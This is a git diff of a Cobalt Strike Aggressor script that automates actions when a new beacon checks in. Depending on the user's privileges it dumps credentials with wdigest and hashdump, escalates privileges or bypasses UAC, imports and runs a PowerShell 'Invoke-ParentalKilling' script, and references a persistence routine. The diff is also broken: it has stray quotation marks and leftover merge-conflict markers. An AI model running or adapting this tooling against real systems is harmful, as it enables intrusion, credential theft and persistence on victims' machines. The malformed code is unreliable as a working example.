@@ -1,28 +1,32 @@
 #################################################
 # Created by @jgaudard  :: I don't twitter much
 # Aggressor script for initial_beacon with cobaltstrike
-# Created: 29 Sept 2016
+# Created: 29 Sept 2016 Modified: 11 Jan 2017
 # Version 1.0
 #################################################
-
-<<<<<<< HEAD
 on beacon_initial {
+    $listener = "local - 443"'
     if("SYSTEM" isin beacon_info($1, "user")) {
-      say("user is system");
       bwdigest($1);
-      blogonpasswords($1);
       bhashdump($1);
-      say("I should setup some persistence...");
+      blog2($1, "I should setup some persistence...");
+      bpowershell_import($1, script_resource("killparents.ps1"));
+      bpowershell($1, "Invoke-ParentalKilling");
     }
     else if(" *" isin beacon_info($1, "user")) {
-      say("user has admin rights");
-      belevate($1, "http_443");   ## http_443 is what I call my listener
+      belevate($1, $listener);
       bsleep($1, 300, 30);
+      bnote($1, "Sleeping - 300 30%");
+      bpowershell_import($1, script_resource("killparents.ps1"));
+      bpowershell($1, "Invoke-ParentalKilling");
     }
     else {
       say("just a regular user, hopefully elevation works");
-      belevate($1, "http_443");
+      bbypassuac($1, $listener");
       bsleep($1, 300, 30);
+      bnote($1, "Sleeping - 300 30%");
+      bpowershell_import($1, script_resource("killparents.ps1"));
+      bpowershell($1, "Invoke-ParentalKilling");
     }
 =======
 sub persist {
@@ -41,48 +45,6 @@ sub persist {
         berror($1, "adsvc.exe does not exist");
     }
 };
-
-## still working on this
-sub listpids {
-    $proc = $2;
-    $gppid = $3;
-    bps($1, lambda({
-        local('$pid $name $entry'); 
-        foreach $entry (split("\n", $2)) {
-            ($name, $ppid, $pid, $arch) = split("\\s+", $entry);
-            if ($gppid eq "1") {
-                if ($name eq $proc) {
-                    return $ppid;
-                }
-                else {
-                    return $pid;
-                }
-            }
-        }
-    }
-))};
-
-on beacon_initial {
-  if("SYSTEM" isin beacon_info($1, "user")) {
-    say("user is system");
-    bwdigest($1);
-    blogonpasswords($1);
-    bhashdump($1);
-    persist($1);
-  }
-  else if(" *" isin beacon_info($1, "user")) {
-    say("user has admin rights");
-    belevate($1, "http_443");   ## http_443 is what I call my listener
-    bsleep($1, 300, 30);
-  }
-  else {
-    say("just a regular user, hopefully elevation works");
-    belevate($1, "http_443");
-    bsleep($1, 300, 30);
-  }
->>>>>>> origin/master
-}
-
 
 #### Testing ###
 ### Using: https://github.com/Und3rf10w/Aggressor-scripts/blob/master/auto-keylogger.cna
